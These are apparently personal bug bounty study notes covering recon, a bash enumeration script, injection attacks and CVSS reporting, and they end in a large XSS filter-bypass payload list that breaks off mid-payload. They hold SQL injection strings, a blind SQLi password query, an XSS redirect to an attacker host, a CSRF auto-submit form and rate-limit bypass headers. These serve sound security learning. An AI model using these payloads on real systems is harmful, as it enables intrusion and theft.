- Don't go to bugcrowd or hackerone straight away
- Look for websites with VDP using [Bug Bounty Dorks](https://github.com/sushiwushi/bug-bounty-dorks/blob/master/dorks.txt)
- When searching, don't look for vulnerabilities on the first or second page websites, go a bit further and check on websites with minimal testing
- Run an nmap scan, to identify the service type and version
	- For example if the server is running drupal, run a wordlist specifically for drupal
- Once you have the versions enumerated, focus on finding exploits for the same on ExploitDB
- Focus on what hurts the company the most
- Stop relying on Automated Tools
- Understand the working of the application before you test it
- Look for places where developers would assume only legitimate requests
- Change perspective, not targets

# Notes

### 3 types
- VDP(Vulnerability Disclosure Program)
- Public Bug Bounty
- Private Bug Bounty

### Note-Taking
-  Try to understand some of their basic features and continue writing what the application has to offer
- Look for IDORs on these features

### Dorking and Reading .js Files

- #### Dorking
	- Using public search engines to find public data about your target. They do the spidering for you
	- **site:example.com inurl:&** - Finding parameters, scrape and try these on every endpoint you discover
	- **site:example.com ext:php(jsp, asp, aspx, xml, txt)** - Discovering content on their sites, maybe sometimes old files that were indexed a long time age, helpful if to get an insight into what type of payloads/bugs to focus on
	- **site:example.com inurl:admin(login, register, signup, unsubscribe, redirect, returnUrl) Get creative! The possibilities are endless. Ask and you shall receive** - Finding functionality to play with
	- On Shodan, simply search for their IP range
### Tools

- BurpSuite
- Extract .js files on any domain
	- GetJS
- Extract URLs and Endpoints from JS files
	- GoLinkFinder
- Fetches known URLs
	- getallurls
- Archive URL Extractor
	- WayBackUrls
- robots.txt Information Extractor
	- WayBackRobots
- Subdomain Scanner
	- Sublist3r
	- MassDNS
	- knock.py
	- Turbolist3r
- Directory discovery, virtual host discovery
	- Ffuf
- Other Bug Bounty Tools
	- XSSHunter
	- SQLMap
	- XXEInjector
	- SSRFDetector
	- GitTools
	- gitallsecrets
	- nmap
	- RaceTheWeb
	- CORStest
	- EyeWitness
	- parameth

### Finding VDP/Bug bounty Programs

- #### Google Dorking
```Queries
inurl:responsible disclosure

"report security vulnerability"

"vulnerability disclosure"

"responsible vulnerability disclosure"

disclose vulnerability "company"

"powered by hackerone" "submit vulnerability report"

indesc:bug bounty|vulnerability disclosure

inurl: bug bounty

"vulnerability reward"

white hat program

"vulnerability reporting policy"

inurl:responsible-disclosure-policy
```

- #### Security.txt
	- It really is as simple as: When looking for a companies security contact make sure to check for `https://www.example.com/.well-known/security.txt`
	- You can even automate scanning for this file to discover programs.

- #### Bug Bounty Platforms
	- hackerone.com
	- bugcrowd.com
	- yeswehack.com
	- intigriti.com
	- synack.com


# To know more about ways to find a specific vulnerability, refer to write-ups

### Reconnaisance and Information Gathering
- **Fingerprinting**
	- **Wappalyzer**
	- **builtwith.com**
- **Directory Bruteforcing**
	- **FFUF**
- **Subdomain Enumeration**
	- **crt.sh**
	- **subfinder**
	- **amass**
	- **assetfinder**
- *Always store findings in a file, followed by `sort -u` for unique sorting, and `grep` to find suitable things off many results*
	- **gowitness** - Clicks screenshots of the domains mentioned in a file

## Authentication and Authorization

### Authentication
- **Bruteforce attacks**
- **Attacking MFA**

### Authorization
- **IDOR**
	- Can be done at user profiles, or any criteria involving user id
- **Broken Access Control**
	- **Autorize**: JWT Testing Tool

## Injection Attacks

### LFI
- **Directory Traversal**
	- Can be done at APIs, or where information is requested
- A good wordlist to test LFI: `/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`

### RFI
- Instead of Local File Injection, you use a remote host to inject files

### SQLi
- **Basic SQLi** : `username'+OR+1=1--`
- **Union-Based SQLi** : `username'+UNION+SELECT+null,+null,+null--`
- **Blind SQLi** : Usually present in cookie values, `sqlmap` preferred for automated testing once SQLi is confirmed
- **SQLi Methodology**:
	- Effective when there are constraints over number of requests
	- First determine type of SQL used : `version()`
	- Determine the number of columns : `union select null, null, null`
	- Determine the table names : `table_name from information_schema.tables`
	- Determine the column names: `column_name from information_schema.columns`
	- *For Blind SQLi *:
		- Use cookies for enumeration of details from the database `and substring(select password from injection0x02 where username='jessamy'),1,1)='a'--`
- [**SQLi Cheat Sheet**](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- **Second Order SQLi**
	- A way to inject payloads, store them in the database, and extract them when required
	- Common Example: Query in username parameter while signing up

### Cross-Site Scripting(XSS)
- 3 Types
	- **Reflected**![[Pasted image 20240628230853.png]]
	- **Stored**![[Pasted image 20240628231108.png]]
		- A good practice for multi-account handling : *Multi-Account Containers Extension by Firefox*
		- Tools to make unique calls to : 
			- *Burp Collaborator*
			- [webhook.site](https://webhook.site)
	- **DOM-Based**![[Pasted image 20240628231147.png]]
		- Way to invoke script : `<img src=x onerror="prompt(1)">`
		- To redirect to an attacker server : `<img src=x onerror="window.location.href='https://attacker-website.com'">`

### Command Injection
- Where to inject commands : Any place that executes commands
- For reverse shell commands
	- *Payload All The Things
	- *HackTricks*
- **Blind Command Injection**
	- When there is no visible response to the query
	- To check the presence of Blind Command Injection : `http://localhost?q='sleep 10'`
	- When injecting commands in between, don't forget to add `#` after the remaining command in order to omit the extra characters

### Server-Side Template Injection
- How to find SSTI : *Look for places with a message box*
- SSTI payload sites:
	- Payload All The Things
	- HackTricks
	- BurpSuite

### XXE Injection
- How to find XXE : *Anywhere with a XML file upload*
- *For good payloads* : Payload All The Things

### Insecure File Uploads
- Can be done in the following ways:
	- *Client-Side* : If check is happening using the client, we can verify that by using the dev console, and network tab, and see if any requests goes when the file is uploaded
		- If the check exists, we can intercept the following parameters in Repeater to check for file upload flaws
			- `filename`
	- *Server-Side* : If the check is happening server-side, it checks for the magic bits (Header which determines the type) of the file that is uploaded. We can inject payloads between the file, after the header, and change the filename with `.php` extension and see if that works
- **Good Resource**
	- AppSecExplained
	- PortSwigger

## Automated Scanners

![[Pasted image 20240630011251.png]]

### Good Extensions for Burp Suite
- ActiveScan++
- Burp Bounty
- Turbo Intruder
- Logger++
- Backslash Powered Scanner
- AuthMatrix
- Autorize
- SAML Raider
- JSON Web Tokens (JWT) Editor
- ActiveScan++ JWT Extension

### Bash Scripting
- Example of Bash Scripting
- Create a new file
```shell
mousepad recon.sh
```
- Bash scripting
```bash
#!/bin/bash

domain=$1 # domain name will be inserted here
RED="\033[1;31m" # just the code for red color
RESET="\033[0m" # just the default value to reset color

subdomain_path=$domain/subdomains # specifies the path for subdomains
screenshot_path=$domain/screenshots # specifies the path for screenshots
scan_path=$domain/scans # specifies the path for scans
js_path=$domain/js # specifies the path for js files
url_path=$domain/urls # specifies the path for urls

if [ ! -d "$domain" ]; then # if domain path does not exist, make path
	mkdir $domain
fi
if [ ! -d "$subdomain_path" ]; then # if subdomain path does not exist, make path
	mkdir $subdomain_path
fi
if [ ! -d "$screenshot_path" ]; then # if screenshot path does not exist, make path
	mkdir $screenshot_path
fi
if [ ! -d "$scan_path" ]; then # if scan path does not exist, make path
	mkdir $scan_path
fi
if [ ! -d "$js_path" ]; then # if js path does not exist, make path
	mkdir $js_path
fi
if [ ! -d "$url_path" ]; then # if url path does not exist, make path
	mkdir $url_path
fi

echo -e "${RED} [+] Launching amass... ${RESET}"
amass enum -brute -active -d $domain | grep $domain >> $subdomain_path/found.txt

echo -e "${RED} [+] Launching Sublist3r... ${RESET}"
sublist3r -d $domain -o $subdomain_path/sublister.txt
cat $subdomain_path/sublister.txt | grep $domain >> $subdomain_path/found.txt

echo -e "${RED} [+] Launching Subfinder... ${RESET}"
subfinder -d $domain -o $subdomain_path/subfinder.txt
cat $subdomain_path/subfinder.txt | grep $domain >> $subdomain_path/found.txt

echo -e "${RED} [+] Launching Assetfinder... ${RESET}"
assetfinder --subs-only $domain | grep $domain >> $subdomain_path/assetfinder.txt
cat $subdomain_path/assetfinder.txt | grep $domain >> $subdomain_path/found.txt

echo -e "${RED} [+] Launching crt.sh... ${RESET}"
curl -s "https://crt.sh/?q=%25.$domain&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | grep $domain >> $subdomain_path/crtsh.txt
cat $subdomain_path/crtsh.txt | grep $domain >> $subdomain_path/found.txt

echo -e "${RED} [+] Finding alive subdomains... ${RESET}"
cat $subdomain_path/found.txt | grep $domain | sort -u | httprobe -prefer-https | sed 's/https\?:\/\///' | tee -a $subdomain_path/alive.txt

echo -e "${RED} [+] Taking screenshots of alive subdomains... ${RESET}"
gowitness file -f $subdomain_path/alive.txt -P $screenshot_path --no-http

echo -e "${RED} [+] Extracting JS files... ${RESET}"
cat $subdomain_path/alive.txt | xargs -I@ bash -c 'getJS -url @ -output $js_path/@.js'

echo -e "${RED} [+] Extracting URLs and Endpoints from JS files... ${RESET}"
find $js_path -name '*.js' -exec bash -c 'GoLinkFinder -i {} -o $url_path/$(basename {}).endpoints.txt' \;

echo -e "${RED} [+] Fetching known URLs... ${RESET}"
cat $subdomain_path/alive.txt | getallurls | tee -a $url_path/known_urls.txt

echo -e "${RED} [+] Extracting Archive URLs... ${RESET}"
cat $subdomain_path/alive.txt | waybackurls | tee -a $url_path/waybackurls.txt

echo -e "${RED} [+] Extracting robots.txt Information... ${RESET}"
cat $subdomain_path/alive.txt | waybackrobots | tee -a $url_path/robots.txt

echo -e "${RED} [+] Launching MassDNS... ${RESET}"
massdns -r lists/resolvers.txt -t A -o S -w $subdomain_path/massdns.txt $subdomain_path/alive.txt

echo -e "${RED} [+] Starting Directory and Virtual Host Discovery... ${RESET}"
gobuster dir -u http://$domain/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o $scan_path/gobuster_directories.txt
ffuf -u http://$domain -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o $scan_path/ffuf_vhosts.txt

echo -e "${RED} [+] Collecting all unique subdomains... ${RESET}"
cat $subdomain_path/found.txt \
    $subdomain_path/alive.txt \
    $subdomain_path/sublister.txt \
    $subdomain_path/subfinder.txt \
    $subdomain_path/assetfinder.txt \
    $subdomain_path/findomain.txt \
    $subdomain_path/crtsh.txt \
    $subdomain_path/massdns.txt \
    $subdomain_path/knockpy.txt \
    $subdomain_path/turbolist3r.txt | sort -u > $subdomain_path/all_unique_subdomains.txt

echo -e "${RED} [+] All unique subdomains saved to $subdomain_path/all_unique_subdomains.txt ${RESET}"

echo -e "${RED} [+] Taking screenshots of alive subdomains... ${RESET}"
gowitness file -f $subdomain_path/all_unique_subdomains.txt -P $screenshot_path --no-http
```
- To run the file
```bash
chmod +x recon-new.sh
./recon-new.sh example.com
```

## Other Common Vulnerabilities

### CSRF
- We can generate PoC for a request using Burp > Engagement Tools > Generate CSRF Token PoC
- Main concept of CSRF is for another user to open a link or a file that we created, and the function of the file contains a code that changes the email of the user that is logged in, and submits the form automatically
- Even if the CSRF token is present, check if the token is validated or its presence is enough

### SSRF
- Happens when the application makes API calls to an endpoint
- Can be manipulated to point to directories whose access is denied, since it is the application that's making the request
- Can be done by changing the value of `url` parameter when the request is being made to fetch APIs
- #### Blind SSRF Attacks
	- When the data is going through some form of check, but still fetches the data from the server
	- We can use our own Collaborator payload in the `url` parameter
- Impact of blind SSRF can be tricky, so dig before you report

### Subdomain Takeovers
- When a subdomain points to a domain that is no longer working
- Buying of the domain can lead to takeover of that particular subdomain

### Open Redirects
- When the URL contains a redirect URL, which can be changed to point to some attacker-controlled site

### Vulnerable Components
- Sometimes, website use plugins or other components
- Many times, these plugins are not updated, leading to possible exploitation via known vulnerabilities

# Reporting

### CVSS
![[Pasted image 20240701024639.png]]

### CVSS Components
![[Pasted image 20240701030304.png]]
#### Base Metrics: Exploitability
![[Pasted image 20240701031540.png]]

#### Base Metrics: Impact
![[Pasted image 20240701031721.png]]

#### Base Metrics: Scope
![[Pasted image 20240701032110.png]]

#### Temporal Metrics
![[Pasted image 20240701032348.png]]

#### Environmental Metrics: Modified
![[Pasted image 20240701032531.png]]

#### Environmental Metrics: Requirements
![[Pasted image 20240701032633.png]]

### CVSS and Bug Bounty
![[Pasted image 20240701032731.png]]

### CVSS Limitations
![[Pasted image 20240701032913.png]]

### CVSS Versions
![[Pasted image 20240701033029.png]]

- Good CVSS Score Advisor : https://www.cvssadvisor.com

# Penetration Testing Reports

### When performing a penetration test, use https://securityheaders.com to see all the missing headers

### You can also run nmap with `--script=ssl-enum-ciphers` to know about encryption

## Communicating with Clients and Triagers

![[Pasted image 20240704233429.png]]

![[Pasted image 20240704233634.png]]

![[Pasted image 20240704233859.png]]

![[Pasted image 20240704233946.png]]

## Common Mistakes

![[Pasted image 20240704234226.png]]

# Evasion Techniques

### WAF Identification and Fingerprinting
- Tool for WAF fingerprinting : `wafw00f`
- Syntax: `wafw00f <Target URL>`
### Bypassing Input Validation
- If normal XSS `<script>prompt()</script>` doesn't work
	- Try using `<img src=1 onerror=prompt()>`
	- Alternatively, try using script tags recursively `<scri<script>pt>prompt()</scri</script>pt>`

# Picking a Bug Bounty Program

![[Pasted image 20240705000733.png]]

![[Pasted image 20240705000931.png]]

![[Pasted image 20240705001006.png]]

# Notes from Public Reports
- ## XSS Reflected
	- Use the following script for XSS `"><img src=x onerror=alert(document.domain)>`
	- regionConfirm parameter XSS
	- `https://partners.uber.com/signup/global/?place_id=ChIJPaCKh-tmA4wR7JEkNDrNDSU&location=Carolina)<script>alert(1)</script>a%2C+Carolina"%2C+Puerto+Rico&lat=18.3807819&lng=-65.95738719999997`
	- 
- ## CSRF
	- https://hackerone.com/reports/547
		- Attacker creates a fake account and changes e-mail
		- The e-mail confirmation link can now be used to CSRF login someone into the fake account, then monitor actions performed by the victim or even interact with him.
	- https://hackerone.com/reports/96470
		- ```1<html> 2<head><title>csrf</title></head> 3<body onLoad="document.forms[0].submit()"> 4<form action="https://app.shopify.com/services/partners/api_clients/1105664/export_installed_users" method="GET"> 5</form> 6</body> 7</html>```
	- 
- ## Access Control - Generic
	- https://hackerone.com/reports/56511
		- IDOR functionality, allowing users to expire all other user sessions by changing the value
	- 
- ## Bruteforcing
	- https://hackerone.com/reports/385381
		- Checking of rate limitation on endpoints
	- https://hackerone.com/reports/225897
		- Throttling can be overcome by using `X-Forwarded-For` header
			- `X-Foorwarded-For: 127.0.0.1`
	- https://hackerone.com/reports/827484
		- Missing rate limit for `Current Password` field
		- Check for rate limitations on password change after signing up
	- https://hackerone.com/reports/744692
		- Login parameter might be vulnerable to password Brute-Forcing
	- https://hackerone.com/reports/1075827
		- Brute-forcing verification code
	- https://hackerone.com/reports/1170522
		- No rate limitation on Password Reset page
- ## Password in configuration file
	- https://hackerone.com/reports/291057
		- The backup process is cleaned by a script `/scripts/final_cleanup.sh`
		- You could navigate to `/scripts/` directory, which reveals sensitive information about the database

# Methodology
- ### Enumeration
```bash
amass enum -brute -active -d domain.com -o amass-output.txt

cat amass-output.txt | httprobe -p http:81 -p http:3000 -p https:3000 -p http:3001 -p https:3001 -p http:8000 -p http:8080 -p https:8443 -c 50 | tee online-domains.txt

cat amass-output.txt | dnsgen - | httprobe

cat domains-endpoints.txt | aquatone

ffuf -ac -v -u https://domain/FUZZ -w wordlist.txt
```
# Common issues to start with

- Look for filters and aim to bypass them
- Test functionality right in front of you to see if it's secure to the most basic bug types
## Cross-Site Scripting(XSS)
- Test every parameter I find that is reflected, not only for reflective XSS but for blind XSS as well
- **Common Problem**: Filters and WAFs 
- Remember, a filter with a parameter is most likely vulnerable to XSS
### Process
#### Step One: Testing Different Encodings and Checking for Weird Behavior
- **Objective:** Identify what payloads are allowed and how the website reflects or handles them.
- **Basic Tests:**
    - Test basic HTML tags (`<h2>`, `<img>`, `<table>`) to see if they are reflected as HTML.
    - Check if these tags are filtered or reflected as escaped characters (`&lt;`, `%3C`).
- **Encoding Tests:**
    - If tags are escaped, test for double encoding (`%253C`, `%26lt;`).
    - Check for any interesting encoding behaviors.
    - Reference: [d3adend.org XSS Ghetto Bypass](https://d3adend.org/xss/ghettoBypass).
- **Reflection Handling:**
    - If `<script>` is reflected as `&lt;script&gt;` but `%26lt;script%26gt;` is reflected as `<script>`, investigate further.
    - Consistent escaping of tags (`&lt;script&gt;`, `%3Cscript%3E`) might indicate non-vulnerability.

#### Step Two: Reverse Engineering the Developer's Thoughts

- **Objective:** Understand the filtering logic used by the developer.
- **Identify Filter Patterns:**
    - Check if specific tags like `<script>`, `<iframe>`, and attributes like `onerror=` are filtered.
    - Look for partial or incomplete tag handling (`<script src=//mysite.com?c=`).
- **Blacklist Analysis:**
    - Determine if a blacklist of bad HTML tags is used.
    - Check for forgotten tags or attributes (e.g., `<svg>`).
    - Investigate if the same filter is applied elsewhere in the web application.
- **Encoding Handling:**
    - Test various encodings (`<%00iframe`, `on%0derror`, `%0d`, `%0a`, `%09`).
    - Try different combinations and formats to explore potential bypasses.

#### Testing for XSS Flow
- **Non-malicious HTML Tags:** Test how tags like `<h2>` are handled.
- **Incomplete Tags:** Test incomplete tags like `<iframe src=//zseano.com/c=`.
- **Encodings:** Test with different encodings (`<%00h2`, `%0d`, `%0a`, `%09`).
- **Blacklist Bypass:**
    - Test if variations like `</script/x>`, `<ScRipt>` are filtered.
    - Try different case variations and malformed tags.

#### Resources for Further Learning
- **Payloads:** Find common payloads for XSS bypass on [zseano.com](https://www.zseano.com/).
- **Cheat Sheet:** Refer to the [Browser's XSS Filter Bypass Cheat Sheet](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet) for more techniques.
---
### Payloads
- A ghetto collection of XSS payloads that I find to be useful during penetration tests, especially when faced with WAFs or application-based black-list filtering, but feel free to disagree or shoot your AK-74 in the air.

```html
Simple character manipulations.  
Note that I use hexadecimal to represent characters that you probably can't type.  For example, \x00 equals a null byte, but you'll need to encode this properly depending on the context (URL encoding \x00 = %00).

HaRdc0r3 caS3 s3nsit1vITy bYpa55!
<sCrIpt>alert(1)</ScRipt>
<iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)>

Null-byte character between HTML attribute name and equal sign (IE, Safari).
<img src='1' onerror\x00=alert(0) />

Slash character between HTML attribute name and equal sign (IE, Firefox, Chrome, Safari).
<img src='1' onerror/=alert(0) />

Vertical tab between HTML attribute name and equal sign (IE, Safari).
<img src='1' onerror\x0b=alert(0) />

Null-byte character between equal sign and JavaScript code (IE).
<img src='1' onerror=\x00alert(0) />

Null-byte character between characters of HTML attribute names (IE).
<img src='1' o\x00nerr\x00or=alert(0) />

Null-byte character before characters of HTML element names (IE).
<\x00img src='1' onerror=alert(0) />

Null-byte character after characters of HTML element names (IE, Safari).
<script\x00>alert(1)</script>

Null-byte character between characters of HTML element names (IE).
<i\x00mg src='1' onerror=alert(0) />

Use slashes instead of whitespace (IE, Firefox, Chrome, Safari).
<img/src='1'/onerror=alert(0)>

Use vertical tabs instead of whitespace (IE, Safari).
<img\x0bsrc='1'\x0bonerror=alert(0)>

Use quotes instead of whitespace in some situations (Safari).
<img src='1''onerror='alert(0)'>
<img src='1'"onerror="alert(0)">

Use null-bytes instead of whitespaces in some situations (IE).
<img src='1'\x00onerror=alert(0)>

Just don't use spaces (IE, Firefox, Chrome, Safari).
<img src='1'onerror=alert(0)>

Prefix URI schemes.
Firefox (\x09, \x0a, \x0d, \x20)
Chrome (Any character \x01 to \x20)
<iframe src="\x01javascript:alert(0)"></iframe> <!-- Example for Chrome -->

No greater-than characters needed (IE, Firefox, Chrome, Safari).
<img src='1' onerror='alert(0)' <

Extra less-than characters (IE, Firefox, Chrome, Safari).
<<script>alert(0)</script>

Backslash character between expression and opening parenthesis (IE).
<style>body{background-color:expression\(alert(1))}</style>

JavaScript Escaping
<script>document.write('<a hr\ef=j\avas\cript\:a\lert(2)>blah</a>');</script>

Encoding Galore.

HTML Attribute Encoding
<img src="1" onerror="alert(1)" />
<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
<iframe src="javascript:alert(1)"></iframe>
<iframe src="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"></iframe>

URL Encoding
<iframe src="javascript:alert(1)"></iframe>
<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>

CSS Hexadecimal Encoding (IE specific examples)
<div style="x:expression(alert(1))">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))">Joker</div>
<div style="x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029">Joker</div>

JavaScript (hexadecimal, octal, and unicode)
<script>document.write('<img src=1 onerror=alert(1)>');</script>
<script>document.write('\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x31\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x61\x6C\x65\x72\x74\x28\x31\x29\x3E');</script>
<script>document.write('\074\151\155\147\040\163\162\143\075\061\040\157\156\145\162\162\157\162\075\141\154\145\162\164\050\061\051\076');</script>
<script>document.write('\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0031\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u003E');</script>

JavaScript (Decimal char codes)
<script>document.write('<img src=1 onerror=alert(1)>');</script>
<script>document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,49,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,48,41,62));</script>

JavaScript (Unicode function and variable names)
<script>alert(123)</script>
<script>\u0061\u006C\u0065\u0072\u0074(123)</script>

Overlong UTF-8 (SiteMinder is awesome!)
< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2

<img src="1" onnerror="alert(1)">
%E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE

UTF-7 (Missing charset?)
<img src="1" onerror="alert(1)" />
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-

Unicode .NET Ugliness
<script>alert(1)</script>
%uff1cscript%uff1ealert(1)%uff1c/script%uff1e

Classic ASP performs some unicode homoglyphic translations... don't ask why...
<img src="1" onerror="alert('1')">
%u3008img%20src%3D%221%22%20onerror%3D%22alert(%uFF071%uFF07)%22%u232A

Useless and/or Useful features.

HTML 5 (Not comphrensive)
<video src="http://www.w3schools.com/html5/movie.ogg" onloadedmetadata="alert(1)" />
<video src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)" />

Usuage of non-existent elements (IE)
<blah style="blah:expression(alert(1))" />

CSS Comments (IE)
<div style="z:exp/*anything*/res/*here*/sion(alert(1))" />

Alternate ways of executing JavaScript functions
<script>window['alert'](0)</script>
<script>parent['alert'](1)</script>
<script>self['alert'](2)</script>
<script>top['alert'](3)</script>

Split up JavaScript into HTML attributes
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>

HTML is parsed before JavaScript
<script>
var junk = '</script><script>alert(1)</script>';
</script>

HTML is parsed before CSS
<style>
body { background-image:url('http://www.blah.com/</style><script>alert(1)</script>'); }
</style>

XSS in XML documents [doctype = text/xml] (Firefox, Chrome, Safari).
<?xml version="1.0" ?>
<someElement>
	<a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(1)'/></a>
</someElement>

URI Schemes
<iframe src="javascript:alert(1)"></iframe>
<iframe src="vbscript:msgbox(1)"></iframe> (IE)
<iframe src="data:text/html,<script>alert(0)</script>"></iframe> (Firefox, Chrome, Safari)
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe> (Firefox, Chrome, Safari)

HTTP Parameter Pollution
http://target.com/something.xxx?a=val1&a=val2
ASP.NET 	a = val1,val2
ASP 		a = val1,val2
JSP 		a = val1
PHP 		a = val2

Two Stage XSS via fragment identifier (bypass length restrictions / avoid server logging)
<script>eval(location.hash.slice(1))</script>
<script>eval(location.hash)</script> (Firefox)

http://target.com/something.jsp?inject=<script>eval(location.hash.slice(1))</script>#alert(1)

Two Stage XSS via name attribute
<iframe src="http://target.com/something.jsp?inject=<script>eval(name)</script>" name="alert(1)"></iframe>

Non-alphanumeric crazyness...
<script>
$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();
</script>

<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!